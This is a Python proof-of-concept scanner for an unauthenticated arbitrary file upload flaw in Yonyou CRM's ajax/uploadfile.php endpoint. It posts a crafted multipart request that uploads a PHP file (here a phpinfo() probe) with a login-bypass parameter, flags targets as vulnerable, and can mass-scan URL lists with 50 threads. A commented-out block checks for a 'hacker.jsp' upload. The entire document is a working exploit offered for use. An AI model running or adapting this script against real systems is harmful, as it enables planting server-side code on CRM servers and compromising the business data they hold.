# 用友crm客户关系管理ajaxuploadfile.php接口任意文件上传漏洞 
import argparse
from multiprocessing.dummy import Pool
import requests
import sys
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
                                             author:watermelon_xz🍉
                        version:用友crm客户关系管理ajaxuploadfile.php接口任意文件上传漏洞
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="用友crm客户关系管理ajaxuploadfile.php接口任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/ajax/uploadfile.php?DontCheckLogin=1&vname=file'
    url = target+payload
    headers = {
        'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Content-Type':'multipart/form-data; boundary=d4a2c340d3f7b0b1ad9a7b2b2b612f46',
        'Content-Length':'291',  
         }
    data = (
        '--d4a2c340d3f7b0b1ad9a7b2b2b612f46\r\n'
        'Content-Disposition: form-data; name="file"; filename="1.php "\r\n'
        'Content-Type: application/octet-stream\r\n'
        '\r\n'
        '<?php phpinfo();?>\r\n'
        '--d4a2c340d3f7b0b1ad9a7b2b2b612f46\r\n'
        'Content-Disposition:  form-data; name="upload"\r\n'
        '\r\n'
        'upload\r\n'
        '--d4a2c340d3f7b0b1ad9a7b2b2b612f46--\r\n'
    )
   
    # payload1='/maupload/apk/hacker.jsp'
    # url1=target+payload1
    # headers1 = {
    # 'Pragma':'no-cache',
    # 'Cache-Control':'no-cache',
    # 'Upgrade-Insecure-Requests':'1',
    # 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
    # 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    # 'Accept-Encoding':'gzip, deflate',
    # 'Accept-Language':'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    # 'Cookie':'JSESSIONID=D5B7B7FE546C5575A59C14E6D446C1C3.server',
    # 'Connection':'close',
    #         }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    #请求网页
    try:
        re = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies)
        # print(re.text)
        if re.status_code == 200 and 'success' in re.text:
            # print("200啦")
            print(f'[+++]该{target}存在用友crm客户关系管理ajaxuploadfile.php接口任意文件上传漏洞')
            # re1= requests.get(url=url1,headers=headers1)
            # if 'This page has a vulnerability' in re1.text:
            #     print(f'[+++]{target}存在任意文件上传漏洞,文件上传后地址为{url1}')
            #     with open('result.txt',mode='a',encoding='utf-8')as ft:
            #         ft.write(target+'\n')
            #     return True
        else:
            print(f'该{target}不存在该漏洞')
    except:
        print(f'该{target}存在问题，请手动测试')



if __name__ == '__main__':
    main()